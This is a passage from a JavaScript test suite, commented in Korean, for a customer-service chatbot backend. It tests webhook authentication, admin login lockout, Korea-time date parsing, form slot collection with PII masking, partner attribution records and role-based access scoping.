  assert.equal(kakao.authenticateKakao(h({ 'x-skill-token': 'wrong' }), body, { KAKAO_SKILL_TOKEN: 'right' }).reason, 'bad_token');
  assert.equal(kakao.authenticateKakao(h({ 'x-skill-token': 'right' }), body, { KAKAO_SKILL_TOKEN: 'right' }).ok, true);
});

test('카카오 웹훅 인증 — 시크릿이 있으면 서명이 맞아야만 통과한다', opts, async () => {
  const kakao = await importLib('kakao', ['webhookAuth']);
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = '{"userRequest":{"utterance":"안녕"}}';
  const env = { KAKAO_WEBHOOK_SECRET: 's3cr3t' };
  const sig = wa.signPayload('s3cr3t', ts, body);

  assert.equal(
    kakao.authenticateKakao(new Headers({ 'x-kakao-signature': sig, 'x-kakao-timestamp': ts }), body, env, now).ok,
    true,
  );
  assert.equal(
    kakao.authenticateKakao(new Headers({ 'x-kakao-signature': 'deadbeef', 'x-kakao-timestamp': ts }), body, env, now).reason,
    'mismatch',
  );
  assert.equal(kakao.authenticateKakao(new Headers(), body, env, now).reason, 'missing_signature');
});

/* ══════════ 관리자 인증 잠금 ══════════ */

test('토큰 대입이 반복되면 잠근다(성공하면 즉시 해제)', opts, async () => {
  const aa = await importLib('adminAuth', []);
  aa.resetLockouts();
  const now = 1_700_000_000_000;
  const threshold = aa.lockThreshold();

  let st;
  for (let i = 1; i <= threshold; i += 1) st = aa.recordAttempt('1.2.3.4', false, now + i);
  assert.equal(st.locked, true, `${threshold}회 실패하면 잠겨야 한다`);
  assert.ok(st.retryAfterSec > 0);

  // 잠긴 동안은 실패를 더 세지 않는다(잠금 무한 연장 방지)
  const during = aa.recordAttempt('1.2.3.4', false, now + 1000);
  assert.equal(during.failures, st.failures);

  // 다른 IP는 영향 없음
  assert.equal(aa.lockoutStatus('9.9.9.9', now).locked, false);

  // 잠금 시간이 지나면 다시 시도할 수 있고, 성공하면 카운트가 비워진다
  const after = now + aa.lockDurationMs() + 1000;
  assert.equal(aa.lockoutStatus('1.2.3.4', after).locked, false);
  assert.equal(aa.recordAttempt('1.2.3.4', true, after).failures, 0);
  aa.resetLockouts();
});

/* ══════════ 한국 시간 달력 (DS 21-x) ══════════ */

// 기준 시각은 **오프셋을 명시한 절대 시각**으로만 쓴다. `new Date(y, m, d, h)` 는 테스트 기계의
// 시간대로 조립된 뒤 같은 시간대로 읽히므로, 시간대 결함이 있어도 언제나 통과한다
// (종전 FIXED_NOW 가 그래서 UTC 서버의 하루 어긋남을 한 번도 잡지 못했다).
const KST_EARLY = new Date('2026-10-01T02:00:00+09:00'); // = 2026-09-30T17:00Z — UTC 달력으로는 9월 30일
const KST_LATE = new Date('2026-09-30T23:00:00+09:00'); // = 2026-09-30T14:00Z — 두 달력이 같은 날

test('한국 자정 직후의 「오늘」은 한국 날짜다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  assert.equal(k.kstDate(KST_EARLY), '2026-10-01');
  assert.equal(k.kstMonth(KST_EARLY), '2026-10');
  assert.equal(k.kstStamp(KST_EARLY), '20261001');
  // 고치기 전 값 — UTC 달력으로 읽으면 하루 전이다(이 간극이 결함의 크기다).
  assert.equal(KST_EARLY.toISOString().slice(0, 10), '2026-09-30');
  assert.equal(k.kstDate(KST_LATE), '2026-09-30');
  assert.equal(k.kstStamp(KST_LATE), '20260930');
});

test('오프셋 계산이 시간대 데이터베이스(Intl)와 같은 날짜를 낸다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  // 독립된 두 번째 구현(ICU 시간대 데이터)과 대조한다 — 서로 어긋나면 한쪽이 틀렸다.
  // 2026-03-08 은 미국 일광절약시간 시작일이다(한국은 영향 없음을 함께 확인).
  for (const iso of ['2026-01-01T00:30:00Z', '2026-03-08T17:30:00Z', '2026-06-15T15:00:00Z', '2026-09-30T17:00:00Z', '2026-12-31T23:59:00Z']) {
    const d = new Date(iso);
    assert.equal(k.kstDate(d), d.toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' }), iso);
  }
});

/**
 * ★ 이 테스트만 **다른 시간대의 프로세스에서** 돌린다.
 *
 * 이 기계는 Asia/Seoul 이라, 날짜를 로컬 게터로 읽는 옛 코드도 여기서는 정답을 낸다 —
 * 즉 같은 프로세스 안에서는 어떤 입력을 주어도 결함을 재현할 수 없다(종전 테스트가 통과한 이유).
 * 배포 환경(Vercel Node = UTC)과 UTC 보다 뒤진 시간대를 자식 프로세스로 만들어 실제로 돌린다.
 */
// 자식 프로세스가 쓰는 컴파일 결과. 정산(settlement)까지 포함해야 기준월 기본값을 같이 돌릴 수 있다.
const TZ_LIBS = ['kst', 'slots', 'normalize', 'handoff', 'settlement', 'partners', 'storage', 'logger', 'monitoring'];

function runInTz(tz) {
  const dir = compileLibs(TZ_LIBS);
  const url = (n) => JSON.stringify(pathToFileURL(path.join(dir, `${n}.mjs`)).href);
  const code = [
    `import assert from 'node:assert/strict';`,
    `import { parseDateTime } from ${url('slots')};`,
    `import { kstDate, kstMonth, kstStamp } from ${url('kst')};`,
    `import { currentMonth } from ${url('settlement')};`,
    `assert.equal(Intl.DateTimeFormat().resolvedOptions().timeZone, ${JSON.stringify(tz)}, '자식 프로세스에 시간대가 걸리지 않았다');`,
    // 고객이 한국 시간 10월 1일 새벽 2시에 "오늘"이라고 말한다(= UTC 9월 30일 17시).
    `const early = new Date('2026-10-01T02:00:00+09:00');`,
    // 재현 전제: 이 시간대의 로컬 달력은 아직 9월 30일이다(고치기 전 코드가 읽던 값).
    `assert.equal(early.getDate(), 30, '재현 전제가 깨졌다 — 이 시간대에서는 로컬 달력이 9월 30일이어야 한다');`,
    `assert.equal(parseDateTime('오늘 오후 2시', early).value, '2026-10-01 14:00');`,
    `assert.equal(parseDateTime('내일', early).value, '2026-10-02 (시간 미정)');`,
    `assert.equal(parseDateTime('9월 30일 14시', early).value, '2027-09-30 14:00');`,
    `assert.equal(kstDate(early), '2026-10-01');`,
    `assert.equal(kstStamp(early), '20261001', '내려받는 파일 이름의 날짜');`,
    `assert.equal(kstMonth(early), '2026-10');`,
    `assert.equal(currentMonth(early), '2026-10', '정산 기준월 기본값');`,
  ].join('\n');
  execFileSync(process.execPath, ['--input-type=module', '-e', code], {
    env: { ...process.env, TZ: tz },
    stdio: 'pipe',
    encoding: 'utf8',
  });
}

test('서버 시간대가 UTC 여도 「오늘」은 한국 날짜다 (DS 21-1·21-2·21-3)', opts, () => {
  runInTz('UTC'); // 배포 환경(Vercel Node 런타임)
  runInTz('America/New_York'); // UTC 보다 더 뒤진 시간대 — 반대 방향으로도 어긋나지 않는지
});

test('달력 계산이 달·해를 넘긴다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  assert.deepEqual(k.normalizeYmd(2026, 9, 31), { y: 2026, m: 10, d: 1 }, '없는 날짜는 다음 달로 넘긴다');
  assert.deepEqual(k.normalizeYmd(2026, 12, 32), { y: 2027, m: 1, d: 1 }, '해를 넘긴다');
  assert.deepEqual(k.normalizeYmd(2028, 2, 29), { y: 2028, m: 2, d: 29 }, '윤년 2월 29일은 그대로 둔다');
  assert.ok(k.compareYmd({ y: 2026, m: 9, d: 30 }, { y: 2026, m: 10, d: 1 }) < 0);
  assert.equal(k.compareYmd({ y: 2026, m: 9, d: 30 }, { y: 2026, m: 9, d: 30 }), 0);
  assert.ok(k.compareYmd({ y: 2027, m: 1, d: 1 }, { y: 2026, m: 12, d: 31 }) > 0);
});

/* ══════════ 멀티턴 슬롯 수집 — 순수 엔진 ══════════ */

// 2026-09-03(목) 10:00 KST — 상대 날짜 계산 기준 고정(절대 시각으로 적어 기계 시간대와 무관하게).
const FIXED_NOW = new Date('2026-09-03T10:00:00+09:00');

test('한국 자정~오전 9시에 말한 「오늘」이 어제로 접수되지 않는다 (DS 21-1)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  // 고객은 10월 1일 새벽 2시에 "오늘"이라고 말했다. 서버(UTC)는 9월 30일이다.
  assert.equal(parseDateTime('오늘 오후 2시', KST_EARLY).value, '2026-10-01 14:00');
  assert.equal(parseDateTime('내일 오후 2시', KST_EARLY).value, '2026-10-02 14:00');
  assert.equal(parseDateTime('모레', KST_EARLY).value, '2026-10-03 (시간 미정)');
  // 연도 미기재 — 한국에서는 이미 지난 날짜(어제)이므로 내년으로 본다.
  assert.equal(parseDateTime('9월 30일 14시', KST_EARLY).value, '2027-09-30 14:00');
  // 경계를 넘긴 뒤에는 종전과 같은 값이다(두 달력이 같은 날인 시간대).
  assert.equal(parseDateTime('오늘 09:30', KST_LATE).value, '2026-09-30 09:30');
});

test('날짜·시간 표현을 파싱한다(상대·절대·오전오후)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  assert.equal(parseDateTime('내일 오후 2시', FIXED_NOW).value, '2026-09-04 14:00');
  assert.equal(parseDateTime('오늘 09:30', FIXED_NOW).value, '2026-09-03 09:30');
  assert.equal(parseDateTime('2026-09-10 14:30', FIXED_NOW).value, '2026-09-10 14:30');
  assert.equal(parseDateTime('9월 10일 14시', FIXED_NOW).value, '2026-09-10 14:00');
  // 연도 미기재이고 이미 지난 날짜면 내년으로 본다(예약은 미래가 기본)
  assert.equal(parseDateTime('1월 5일', FIXED_NOW).value, '2027-01-05 (시간 미정)');
});

test('알아볼 수 없는 날짜 입력은 null(실패 경로)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  assert.equal(parseDateTime('아무때나요', FIXED_NOW), null);
  assert.equal(parseDateTime('', FIXED_NOW), null);
});

test('선택지는 번호·동의어 양쪽으로 고를 수 있다', opts, async () => {
  const { matchChoice } = await eng('slots');
  const choices = ['웹 챗봇', '카카오톡', '전화 콜봇', '기타'];
  assert.equal(matchChoice(choices, '2'), '카카오톡');
  assert.equal(matchChoice(choices, '2번'), '카카오톡');
  assert.equal(matchChoice(choices, '카톡'), '카카오톡', '동의어 사전이 적용돼야 한다');
  assert.equal(matchChoice(choices, '9'), null, '범위 밖 번호는 거절');
  assert.equal(matchChoice(choices, '몰라요'), null);
});

test('잘못된 입력은 어느 항목이 왜 틀렸는지 + 예시를 돌려준다', opts, async () => {
  const { validateSlot, getForm, slotOf } = await eng('slots');
  const form = getForm('reservation');
  const contact = slotOf(form, 'contact');
  const bad = validateSlot(contact, '그냥 아무거나', FIXED_NOW);
  assert.equal(bad.ok, false);
  assert.match(bad.message, /연락처/);
  assert.match(bad.message, /010-1234-5678/, '입력 예시를 함께 줘야 한다');
  const good = validateSlot(contact, '연락처는 010-1234-5678 입니다', FIXED_NOW);
  assert.equal(good.ok, true);
  assert.equal(good.value, '010-1234-5678');
});

test('필수 항목은 건너뛸 수 없고, 선택 항목은 건너뛴다', opts, async () => {
  const slots = await eng('slots');
  const reservation = slots.getForm('reservation');
  const started = slots.startForm(reservation);
  const skipRequired = slots.applyInput(reservation, started.state, '건너뛰기', FIXED_NOW);
  assert.equal(skipRequired.kind, 'invalid');
  assert.match(skipRequired.message, /꼭 필요/);

  const trouble = slots.getForm('trouble');
  let st = slots.startForm(trouble).state;
  st = slots.applyInput(trouble, st, '위젯이 열리지 않아요', FIXED_NOW).state;
  st = slots.applyInput(trouble, st, '1', FIXED_NOW).state;
  const done = slots.applyInput(trouble, st, '건너뛰기', FIXED_NOW);
  assert.equal(done.kind, 'complete', '선택 항목(연락처)은 건너뛰면 바로 완료');
  assert.equal('contact' in done.values, false, '건너뛴 값은 저장하지 않는다');
  assert.equal(done.values.channel, '웹 챗봇');
});

test('"이전"은 직전 항목을 지우고 다시 묻는다', opts, async () => {
  const slots = await eng('slots');
  const form = slots.getForm('reservation');
  let st = slots.startForm(form).state;
  st = slots.applyInput(form, st, '홍길동', FIXED_NOW).state;
  assert.equal(st.values.name, '홍길동');
  const back = slots.applyInput(form, st, '이전', FIXED_NOW);
  assert.equal(back.kind, 'progress');
  assert.equal(back.slot.key, 'name');
  assert.equal('name' in back.state.values, false, '되돌린 항목의 값은 비워야 한다');
  // 첫 항목에서 "이전"은 되돌릴 곳이 없다고 안내한다(무반응 금지)
  const noBack = slots.applyInput(form, back.state, '이전', FIXED_NOW);
  assert.equal(noBack.kind, 'invalid');
  assert.match(noBack.message, /취소/);
});

/* ══════════ 멀티턴 슬롯 수집 — 대화 엔진 통합 ══════════ */

async function freshEngine() {
  delete process.env.CHAT_SLOT_FORMS;
  delete process.env.CHAT_LLM_LIVE;
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const session = await eng('session');
  const esc = await eng('escalation');
  session.resetSessions();
  return { chat, session, esc };
}

test('예약 접수: 안내 → 3단계 수집 → 티켓 접수(정상 경로)', opts, async () => {
  const { chat, esc } = await freshEngine();
  const sid = 'rt-form-ok';

  const start = chat.replyTo('예약하고 싶어요', sid);
  assert.equal(start.form.id, 'reservation');
  assert.equal(start.form.step, 1);
  assert.equal(start.form.total, 3);
  assert.match(start.reply, /성함/);

  const s2 = chat.replyTo('홍길동', sid);
  assert.equal(s2.form.step, 2);
  assert.match(s2.reply, /날짜/);

  const s3 = chat.replyTo('내일 오후 2시', sid);
  assert.equal(s3.form.step, 3);
  assert.match(s3.reply, /연락처|전화번호/);

  const done = chat.replyTo('010-1234-5678', sid);
  assert.equal(done.form, undefined, '완료 턴에는 진행 표시가 없다');
  assert.ok(done.ticketId, '접수 티켓이 생겨야 한다');
  assert.match(done.reply, /접수번호/);
  assert.equal(done.reply.includes('010-1234-5678'), false, '원문 연락처를 화면에 그대로 노출하지 않는다');
  assert.match(done.reply, /010-\*\*\*\*-5678/, '마스킹된 형태로 확인시켜 준다');

  const ticket = esc.listTickets().find((t) => t.id === done.ticketId);
  assert.equal(ticket.reasonCode, 'customer_request');
  assert.match(ticket.summary, /예약자 성함: 홍길동/);
  assert.match(ticket.summary, /희망 일시/);
  assert.equal(ticket.summary.includes('010-1234-5678'), false, '이관 요약에도 원문 연락처가 남으면 안 된다');
});

test('같은 항목을 3번 못 알아들으면 상담원으로 넘긴다(실패 경로)', opts, async () => {
  const { chat, esc } = await freshEngine();
  const sid = 'rt-form-retry';
  chat.replyTo('예약하고 싶어요', sid);
  chat.replyTo('홍길동', sid);

  const r1 = chat.replyTo('아무때나요', sid);
  assert.match(r1.reply, /알아보지 못했어요/, '무엇이 왜 틀렸는지 알려야 한다');
  assert.equal(r1.form.step, 2, '같은 항목을 다시 묻는다');
  const r2 = chat.replyTo('그냥 편한 시간', sid);
  assert.equal(r2.form.step, 2);
  const r3 = chat.replyTo('알아서 해주세요', sid);
  assert.equal(r3.escalate, true);
  assert.ok(r3.ticketId);
  assert.equal(r3.handoffReason, 'max_retry');
  const ticket = esc.listTickets().find((t) => t.id === r3.ticketId);
  assert.equal(ticket.reasonCode, 'max_retry');
  assert.match(ticket.summary, /미수집 정보/, '무엇을 못 받았는지 상담원에게 알려야 한다');
});

test('"취소"로 수집을 중단하면 다음 질문은 정상 처리된다', opts, async () => {
  const { chat } = await freshEngine();
  const sid = 'rt-form-cancel';
  chat.replyTo('예약하고 싶어요', sid);
  const cancelled = chat.replyTo('취소', sid);
  assert.equal(cancelled.form, undefined);
  assert.match(cancelled.reply, /중단/);
  assert.equal(cancelled.ticketId, undefined, '취소는 접수를 만들지 않는다');

  const after = chat.replyTo('영업시간 알려주세요', sid);
  assert.equal(after.intent, 'hours', '취소 후 일반 대화로 즉시 복귀한다');
});

test('수집 중 상담원을 요청하면 즉시 이관한다', opts, async () => {
  const { chat } = await freshEngine();
  const sid = 'rt-form-agent';
  chat.replyTo('예약하고 싶어요', sid);
  const r = chat.replyTo('상담원 연결해 주세요', sid);
  assert.equal(r.escalate, true);
  assert.ok(r.ticketId);
  assert.equal(r.form, undefined);

  // 반대로 '연결이 안 돼요' 같은 증상 설명은 이관으로 새면 안 된다
  const sid2 = 'rt-form-agent-2';
  chat.replyTo('오류가 났어요', sid2);
  const symptom = chat.replyTo('연결이 안 돼요', sid2);
  assert.equal(symptom.form.id, 'trouble');
  assert.equal(symptom.form.step, 2, '증상으로 받아들이고 다음 항목으로 진행해야 한다');
});

test('게이트를 끄면(CHAT_SLOT_FORMS=false) 기존 룰 응답만 나간다', opts, async () => {
  const { chat } = await freshEngine();
  process.env.CHAT_SLOT_FORMS = 'false';
  try {
    const r = chat.replyTo('예약하고 싶어요', 'rt-form-off');
    assert.equal(r.form, undefined);
    assert.equal(r.intent, 'reservation');
    assert.equal(r.source, 'rule');
  } finally {
    delete process.env.CHAT_SLOT_FORMS;
  }
});

test('모든 폼 정의에 라벨·질문·예시가 채워져 있다(빈 화면 방지)', opts, async () => {
  const { FORMS } = await eng('slots');
  assert.ok(FORMS.length > 0);
  for (const form of FORMS) {
    assert.ok(form.title && form.slots.length > 0, `${form.id}: 제목·슬롯 필요`);
    for (const slot of form.slots) {
      assert.ok(slot.label && slot.prompt && slot.hint, `${form.id}.${slot.key}: 라벨·질문·예시 필요`);
      if (slot.kind === 'choice') assert.ok(slot.choices?.length >= 2, `${form.id}.${slot.key}: 선택지 필요`);
    }
  }
});

test('마스킹이 날짜를 계좌번호로 오인하지 않는다(회귀)', opts, async () => {
  const { maskPii } = await eng('handoff');
  const r = maskPii('예약 일시 2026-09-04 14:00, 연락처 010-1234-5678');
  assert.match(r.text, /2026-09-04 14:00/, '날짜는 원문 그대로 남아야 상담원이 일정을 안다');
  assert.match(r.text, /010-\*\*\*\*-5678/, '연락처는 마스킹돼야 한다');
  assert.equal(r.hits.includes('phone'), true);
  assert.equal(r.hits.includes('account'), false, '날짜를 계좌로 집계하면 통계가 틀어진다');
  // 진짜 계좌번호는 여전히 마스킹한다
  assert.match(maskPii('계좌 110-234-567890').text, /\*\*\*-\*\*\*\*-\*\*\*\*/);
});

/* ══════════ 파트너(채널) · 매출 귀속 ══════════ */

async function partnersLib() {
  process.env.ADMIN_PERSIST = 'false'; // 테스트는 디스크에 쓰지 않는다
  const lib = await importLib('partners', ['storage', 'logger', 'monitoring']);
  lib.resetPartners();
  return lib;
}

test('고객사는 파트너 없이도 등록된다(직접 계약이 기본)', opts, async () => {
  const P = await partnersLib();
  const r = P.upsertAccount({ name: 'OO의원' });
  assert.equal(r.ok, true);
  assert.equal(r.account.partnerId, null, 'partnerId는 nullable — 없으면 직접 계약');
  assert.equal(r.account.source, 'unknown');
  assert.equal(r.account.attribution.length, 1, '최초 등록도 귀속 근거로 남는다');
  assert.equal(r.account.attribution[0].note, '최초 등록');
});

test('귀속을 바꾸면 이전 값·사유가 이력으로 남는다(정산 근거)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 });
  assert.equal(p.ok, true);
  const created = P.upsertAccount({ name: 'AA치과' });

  const moved = P.upsertAccount({
    id: created.account.id,
    name: 'AA치과',
    partnerId: p.partner.id,
    source: 'partner',
    attributionNote: '파트너 소개로 최초 미팅(2026-08-20)',
    authed: true,
  });
  assert.equal(moved.ok, true);
  assert.equal(moved.account.partnerId, p.partner.id);
  assert.equal(moved.account.attribution.length, 2);
  const last = moved.account.attribution[1];
  assert.equal(last.fromPartnerId, null);
  assert.equal(last.toPartnerId, p.partner.id);
  assert.match(last.note, /파트너 소개/);
  assert.equal(last.authed, true, '인증 여부가 남아야 분쟁 시 근거가 된다');

  // 귀속이 바뀌지 않는 단순 수정은 이력을 늘리지 않는다(노이즈 방지)
  const renamed = P.upsertAccount({ id: created.account.id, name: 'AA치과의원', partnerId: p.partner.id, source: 'partner' });
  assert.equal(renamed.account.attribution.length, 2);
});

test('잘못된 입력은 거절하고 이유를 돌려준다(실패 경로)', opts, async () => {
  const P = await partnersLib();
  assert.equal(P.upsertAccount({ name: '  ' }).error, '고객사명을 입력해 주세요.');
  assert.match(P.upsertAccount({ name: 'BB', partnerId: 'PTR-9999' }).error, /존재하지 않는 파트너/);
  assert.match(P.upsertAccount({ name: 'BB', source: 'partner' }).error, /파트너를 지정/);
  // 형식 토큰(YYYY-MM-DD)·내부 단위(bp)는 거절 문장에 적지 않는다(DS 29-3).
  assert.match(P.upsertAccount({ name: 'BB', contractedAt: '2026-02-31' }).error, /2026-09-01 처럼 연-월-일/);
  assert.match(P.upsertAccount({ name: 'BB', status: 'contracted' }).error, /계약일이 필요/);
  assert.match(P.upsertPartner({ name: 'X', feeRateBp: 99999 }).error, /0~100% 사이의 숫자/);
  assert.match(P.upsertPartner({ name: '' }).error, /파트너명/);
});

test('연결된 고객사가 있는 파트너는 삭제되지 않는다(되돌릴 수 없는 동작 보호)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '테스트파트너' });
  P.upsertAccount({ name: 'CC사', partnerId: p.partner.id, source: 'partner' });
  const blocked = P.deletePartner(p.partner.id);
  assert.equal(blocked.ok, false);
  assert.match(blocked.error, /연결된 고객사가 1곳/);

  // 귀속을 직접 계약으로 옮기면 삭제할 수 있다
  const acc = P.queryAccounts({ partnerId: p.partner.id })[0];
  P.upsertAccount({ id: acc.id, name: acc.name, partnerId: '', source: 'direct', attributionNote: '직접 계약으로 전환' });
  assert.equal(P.deletePartner(p.partner.id).ok, true);
});

test('조회는 queryAccounts 한 곳을 지난다(2계층 확장 지점)', opts, async () => {
  const P = await partnersLib();
  const p1 = P.upsertPartner({ name: '파트너1' }).partner;
  const p2 = P.upsertPartner({ name: '파트너2' }).partner;
  P.upsertAccount({ name: '가나사', partnerId: p1.id, source: 'partner', status: 'contracted', contractedAt: '2026-09-01' });
  P.upsertAccount({ name: '다라사', partnerId: p2.id, source: 'partner' });
  P.upsertAccount({ name: '마바사', source: 'direct' });

  assert.equal(P.queryAccounts().length, 3);
  assert.equal(P.queryAccounts({ partnerId: p1.id }).length, 1);
  assert.equal(P.queryAccounts({ partnerId: 'direct' }).length, 1, '직접 계약만 걸러낼 수 있어야 한다');
  assert.equal(P.queryAccounts({ status: 'contracted' })[0].name, '가나사');
  assert.equal(P.queryAccounts({ q: '다라' }).length, 1);
  assert.equal(P.queryAccounts({ q: '없는회사' }).length, 0);
});

test('수수료율은 설정값이며, 미설정이면 임의 수치를 만들지 않는다', opts, async () => {
  const P = await partnersLib();
  delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  const noFee = P.upsertPartner({ name: '수수료미정' }).partner;
  assert.equal(noFee.feeRateBp, null);
  assert.equal(P.effectiveFeeRateBp(noFee), null, '기본값이 없으면 null이어야 한다(임의 KPI 금지)');
  process.env.PARTNER_DEFAULT_FEE_RATE_BP = '1000';
  try {
    assert.equal(P.effectiveFeeRateBp(noFee), 1000, '설정값이 있으면 그것을 쓴다');
    assert.equal(P.effectiveFeeRateBp({ feeRateBp: 2000 }), 2000, '파트너 개별 설정이 우선');
  } finally {
    delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  }
});

test('집계는 건수만 센다(금액·성과 수치를 지어내지 않는다)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '집계파트너' }).partner;
  P.upsertAccount({ name: 'A', partnerId: p.id, source: 'partner', status: 'contracted', contractedAt: '2026-09-01' });
  P.upsertAccount({ name: 'B', partnerId: p.id, source: 'partner' });
  P.upsertAccount({ name: 'C', source: 'direct' });

  const rows = P.rollupByPartner();
  const row = rows.find((r) => r.partnerId === p.id);
  assert.equal(row.total, 2);
  assert.equal(row.contracted, 1);
  assert.equal(row.prospect, 1);
  const direct = rows.find((r) => r.partnerId === null);
  assert.equal(direct.total, 1);
  assert.equal(Object.keys(row).some((k) => /revenue|amount|매출/.test(k)), false, '금액 필드는 아직 없다');
});

test('스냅샷 복원: 손상 항목은 건너뛰고 고아 귀속은 직접 계약으로 되돌린다', opts, async () => {
  const P = await partnersLib();
  const bad = P.importPartners({ partners: 'nope' });
  assert.equal(bad.ok, false, '형식이 어긋나면 실패를 알린다');

  const r = P.importPartners({
    version: 1,
    partners: [
      { id: 'PTR-0003', name: '복원파트너', status: 'active', feeRateBp: 1200 },
      { id: '', name: '이름없는id' },
    ],
    accounts: [
      { id: 'ACC-0007', name: '정상사', partnerId: 'PTR-0003', source: 'partner', status: 'contracted', contractedAt: '2026-01-02', attribution: [] },
      { id: 'ACC-0008', name: '고아사', partnerId: 'PTR-9999', source: 'partner' },
      { id: 'ACC-0009' },
    ],
  });
  assert.equal(r.ok, true);
  assert.equal(r.partners, 1, '무효 파트너는 건너뛴다');
  assert.equal(r.accounts, 2, '무효 고객사는 건너뛴다');
  assert.equal(P.getAccount('ACC-0008').partnerId, null, '없는 파트너를 가리키면 직접 계약으로 되돌린다');
  // 복원 후 새로 만든 id가 기존 id와 충돌하지 않는다
  const next = P.upsertAccount({ name: '신규사' });
  assert.equal(next.account.id, 'ACC-0010');
  assert.equal(P.upsertPartner({ name: '신규파트너' }).partner.id, 'PTR-0004');
});

/* ══════════ RBAC — 파트너 담당자 권한 ══════════ */

const ADMIN_TOK = 'admin-token-0123456789';
const PTR_TOK = 'partner-token-abcdefghij';

async function rbacLib(env = {}) {
  const lib = await importLib('rbac', ['webhookAuth']);
  delete process.env.ADMIN_TOKEN;
  delete process.env.PARTNER_TOKENS;
  delete process.env.PARTNER_PORTAL_ENABLED;
  Object.assign(process.env, env);
  return lib;
}

function clearRbacEnv() {
  delete process.env.ADMIN_TOKEN;
  delete process.env.PARTNER_TOKENS;
  delete process.env.PARTNER_PORTAL_ENABLED;
}

test('관리자 토큰이 일치하면 admin 주체가 된다', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK });
  const p = R.resolvePrincipal(ADMIN_TOK, { adminAuthRequired: true });
  assert.ok(p, '관리자 토큰은 통과해야 한다');
  assert.equal(p.role, 'admin');
  assert.equal(p.partnerId, null);
  assert.equal(p.authed, true);
  clearRbacEnv();
});

test('틀린 토큰은 주체를 얻지 못한다(실패 경로)', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK });
  assert.equal(R.resolvePrincipal('wrong-token-value-xxxx', { adminAuthRequired: true }), null);
  assert.equal(R.resolvePrincipal('', { adminAuthRequired: true }), null);
  assert.equal(R.resolvePrincipal(null, { adminAuthRequired: true }), null);
  clearRbacEnv();
});

test('파트너 포털이 꺼져 있으면 파트너 토큰은 통하지 않는다(기본 OFF)', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK, PARTNER_TOKENS: `PTR-0001:${PTR_TOK}` });
  assert.equal(R.partnerPortalEnabled(), false, '기본값은 비활성이어야 한다');
  assert.equal(R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true }), null, '게이트 OFF면 거절');
  clearRbacEnv();
});

test('포털이 켜지면 파트너 토큰이 자기 파트너 범위의 주체가 된다', opts, async () => {
  const R = await rbacLib({
    ADMIN_TOKEN: ADMIN_TOK,
    PARTNER_TOKENS: `PTR-0001:${PTR_TOK},PTR-0002:another-token-1234567`,
    PARTNER_PORTAL_ENABLED: 'true',
  });
  const p = R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true });
  assert.ok(p);
  assert.equal(p.role, 'partner_admin');
  assert.equal(p.partnerId, 'PTR-0001');
  assert.equal(R.canWrite(p), false, '파트너 담당자는 읽기 전용이어야 한다');
  assert.equal(R.canWrite({ role: 'admin', partnerId: null, authed: true }), true);
  clearRbacEnv();
});

test('짧은 파트너 토큰·형식 오류 항목은 버려진다', opts, async () => {
  const R = await rbacLib({ PARTNER_PORTAL_ENABLED: 'true' });
  const creds = R.parsePartnerTokens('PTR-0001:short,PTR-0002:proper-token-abcdefgh,badline,PTR-0002:dup-token-abcdefghij');
  assert.equal(creds.length, 1, '유효 항목만 남아야 한다');
  assert.equal(creds[0].partnerId, 'PTR-0002');
  assert.equal(creds[0].token, 'proper-token-abcdefgh');
  clearRbacEnv();
});

test('ADMIN_TOKEN 미설정 + 게이트 ON 이면 전면 차단된다', opts, async () => {
  const R = await rbacLib({ PARTNER_PORTAL_ENABLED: 'true', PARTNER_TOKENS: `PTR-0001:${PTR_TOK}` });
  assert.equal(R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true }), null);
  // 게이트 OFF면 기존 개방 동작(관리자·미인증)
  const open = R.resolvePrincipal(null, { adminAuthRequired: false });
  assert.equal(open.role, 'admin');
  assert.equal(open.authed, false, '개방 모드는 인증된 것으로 기록하지 않는다');
  clearRbacEnv();
});

test('파트너 담당자의 조회 범위는 요청값과 무관하게 자기 파트너로 고정된다', opts, async () => {
  const R = await rbacLib();
  const partner = { role: 'partner_admin', partnerId: 'PTR-0001', authed: true };
  // 남의 파트너를 조회하려 해도 자기 것으로 덮어써진다
  assert.equal(R.scopeAccountFilter(partner, { partnerId: 'PTR-0002' }).partnerId, 'PTR-0001');
  assert.equal(R.scopeAccountFilter(partner, {}).partnerId, 'PTR-0001');
  // 상태 등 다른 필터는 보존된다
  assert.equal(R.scopeAccountFilter(partner, { status: 'contracted' }).status, 'contracted');
  // 관리자는 요청한 필터 그대로
  const admin = { role: 'admin', partnerId: null, authed: true };
  assert.equal(R.scopeAccountFilter(admin, { partnerId: 'PTR-0002' }).partnerId, 'PTR-0002');
  // 파트너 목록도 자기 것만
  const list = [{ id: 'PTR-0001' }, { id: 'PTR-0002' }];
  assert.deepEqual(R.scopePartners(partner, list).map((p) => p.id), ['PTR-0001']);
  assert.equal(R.scopePartners(admin, list).length, 2);
  clearRbacEnv();
});

/* ══════════ 정산 리포트 ══════════ */

async function settlementLib() {
  process.env.ADMIN_PERSIST = 'false';
  delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  // 두 모듈이 **같은 인스턴스**를 공유해야 한다(컴파일 캐시 키가 같도록 의존 목록을 동일하게 준다).
  // (자기 이름을 deps에 넣으면 캐시 키가 어긋나 서로 다른 인스턴스가 된다)
  const rest = ['storage', 'logger', 'monitoring'];
  const P = await importLib('partners', ['settlement', ...rest]);
